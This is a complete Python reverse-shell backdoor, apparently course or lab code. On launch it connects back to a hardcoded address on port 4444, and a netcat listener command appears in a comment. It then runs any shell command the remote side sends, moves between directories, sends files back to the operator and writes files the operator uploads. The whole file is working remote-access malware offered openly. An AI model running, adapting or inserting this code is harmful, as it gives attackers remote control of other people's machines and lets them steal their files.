# nc -vv -l -p 4444

import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port, start=True):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        if start:
            self.run()

    def reliable_send(self, data):
        json_data = json.dumps(data)  # str
        json_data = json_data.encode()  # bytes
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                json_data += self.connection.recv(1024)  # bytes
                json_data_str = json.loads(json_data)  # str
                return json_data_str
            except ValueError:
                continue

    def execute_system_command(self, command):  # bytes -> bytes
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):  # str -> str
        try:
            os.chdir(path)
            return f'[+] Changing working directory to {path}'
        except FileNotFoundError:
            return f'[-] Path {path} not found'

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Upload successful.'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.reliable_receive()  # str
            if command[0] == 'exit':
                self.connection.close()
                exit()
            elif command[0] == 'cd' and len(command) > 1:
                command_result = self.change_working_directory_to(
                    command[1])  # str
            elif command[0] == 'download':
                command_result = self.read_file(command[1])
                command_result = command_result.decode()
            elif command[0] == 'upload':
                command_result = self.write_file(
                    command[1], command[2])
            else:
                command_result = self.execute_system_command(command)  # bytes
                command_result = command_result.decode(errors='replace')  # str
            self.reliable_send(command_result)


Backdoor('10.0.2.13', 4444)
